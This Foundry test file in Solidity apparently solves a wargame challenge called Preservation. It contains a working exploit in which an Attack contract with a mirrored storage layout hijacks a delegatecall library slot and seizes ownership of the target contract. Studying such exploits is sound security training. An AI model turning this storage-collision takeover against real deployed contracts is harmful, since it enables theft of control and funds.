pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";
import "../src/Preservation.sol";

contract Attack {
    uint256[2] private __gap;
    address public owner;

    function setTime(uint256 _timestamp) public {
        owner = address(uint160(_timestamp));
    }
}

contract ASMPreservation is Test {
    address public attacker = address(420);
    Preservation public target;
    address timeZone1LibraryAddress;
    address timeZone2LibraryAddress;
    Attack attackContract;

    function setUp() public {
        timeZone1LibraryAddress = address(new LibraryContract());
        timeZone2LibraryAddress = address(new LibraryContract());
        target = new Preservation(
            timeZone1LibraryAddress,
            timeZone2LibraryAddress
        );
        attackContract = new Attack();
    }

    modifier attack() {
        vm.startPrank(attacker);
        _;
        vm.stopPrank();
    }

    function testASMPreservation() public attack {
        // calling set second time with the timestamp as an address we control will set the tiemzone1 lib
        target.setSecondTime(uint256(uint160(address(attackContract))));

        // now we can set the owner by just matching the storage slot
        target.setFirstTime(uint256(uint160(attacker)));

        assertEq(target.owner(), attacker);
    }
}
